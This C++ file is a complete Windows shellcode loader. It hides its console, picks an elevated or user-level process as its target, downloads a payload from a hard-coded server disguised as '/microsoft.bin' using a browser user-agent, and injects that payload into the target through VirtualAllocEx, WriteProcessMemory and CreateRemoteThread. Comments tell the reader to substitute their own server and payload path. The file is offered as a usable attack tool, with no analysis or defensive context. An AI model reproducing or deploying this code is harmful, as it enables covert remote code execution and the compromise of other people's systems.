#include <iostream>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib") 

struct Shellcode {
	BYTE* pcData;
	DWORD dwSize;
};

BOOL DownloadShellcode(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
BOOL InjectShellcode(DWORD pid, Shellcode shellcode);
BOOL IsCurrentProcessElevated();
BOOL IsOtherProcessElevated(DWORD pid);
DWORD GetFirstAdminPID();
DWORD GetFirstUserPID();
DWORD GetTargetPID();

int main() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE); // Hide console window

	DWORD pid = GetTargetPID();
	if (pid == 0) return 1; 

	struct Shellcode shellcode;
	shellcode.pcData = NULL;
	shellcode.dwSize = 0;

	if (!DownloadShellcode(L"10.200.13.204", 80, &shellcode)) return 2; //Change IP to your server


	if (shellcode.dwSize == 0) return 1;

	if (!InjectShellcode(pid, shellcode)) {
		if (shellcode.pcData) {
			// Clean up allocated shellcode memory on failure
			free(shellcode.pcData);
			return 3;
		}
	}

	if (shellcode.pcData) {
		// Clean up allocated shellcode memory on success
		free(shellcode.pcData);
	}
	return 0;
}

BOOL DownloadShellcode(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
		INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	HINTERNET connection = InternetConnect(session, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	// Add the flags to prevent caching
	DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;

	HINTERNET request = HttpOpenRequest(connection, L"GET", L"/microsoft.bin", NULL, NULL, NULL, dwFlags, 0); // Alter 3rd parameter to your payload path

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, NULL, 0)) {
		counter++;
		Sleep(3000);
		if (counter >= 3) {
			InternetCloseHandle(request);
			InternetCloseHandle(connection);
			InternetCloseHandle(session);
			return 0;
		}
	}

	DWORD bufferSize = BUFSIZ;
	BYTE* buffer = new BYTE[bufferSize];

	DWORD capacity = BUFSIZ;
	BYTE* payload = (BYTE*)malloc(capacity);

	DWORD payloadSize = 0;

	if (!payload) {
		delete[] buffer;
		return 0; // malloc failed
	}

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufferSize, &bytesRead)) {
			delete[] buffer;
			free(payload);
			return 0;
		}

		if (bytesRead == 0) { break; } // End of file

		// Resize payload buffer if necessary
		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			BYTE* newPayload = (BYTE*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}

	delete[] buffer;

	BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	(*shellcode).pcData = payload;
	(*shellcode).dwSize = payloadSize;
	return 1;
}

BOOL InjectShellcode(DWORD pid, Shellcode shellcode) {
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid);

	if (!hProcess) { return 0; }

	LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteAddr) {
		CloseHandle(hProcess);
		return 0;
	};

	if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
		CloseHandle(hProcess);
		return 0;
	};

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return 1;
	}

	CloseHandle(hProcess);
	return 0;
}

BOOL IsCurrentProcessElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
			fRet = elevation.TokenIsElevated;
		}
		CloseHandle(hToken);
	}

	return fRet;
}

BOOL IsOtherProcessElevated(DWORD pid) {
	BOOL fRet = FALSE;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

	if (hProcess) {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD cbSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
				fRet = elevation.TokenIsElevated;
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}

	return fRet;
}

DWORD GetFirstAdminPID() {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32)) {
		do {
			// Ignores System(4), Idle(0) and it self
			if (pe32.th32ProcessID <= 4 || pe32.th32ProcessID == GetCurrentProcessId()) continue;

			// If elevated return process
			if (IsOtherProcessElevated(pe32.th32ProcessID)) {
				CloseHandle(hProcessSnap);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}

	CloseHandle(hProcessSnap);

	return 0;
}

DWORD GetFirstUserPID() {
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32)) {
		do {
			// Ignores System(4), Idle(0) and it self
			if (pe32.th32ProcessID <= 4 || pe32.th32ProcessID == GetCurrentProcessId()) continue;

			// Trys to open to verify if we have access
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);

			if (hProcess) {
				BOOL isElevated = FALSE;

				HANDLE hToken = NULL;
				if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
					TOKEN_ELEVATION elevation;
					DWORD cbSize = sizeof(TOKEN_ELEVATION);
					if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
						isElevated = elevation.TokenIsElevated;
					}
					CloseHandle(hToken);
				}
				CloseHandle(hProcess);

				// If not elevated, we've found a User level proccess and return it
				if (!isElevated) {
					CloseHandle(hProcessSnap);
					return pe32.th32ProcessID;
				}
			}
			// If OpenProcess failed (hProcess == NULL), it is because we do not have access (probably Admin/System), so we continue.

		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);
	return 0;
}

DWORD GetTargetPID() {
	if (IsCurrentProcessElevated()) {
		return GetFirstAdminPID();
	}
	else {
		return GetFirstUserPID();
	}
}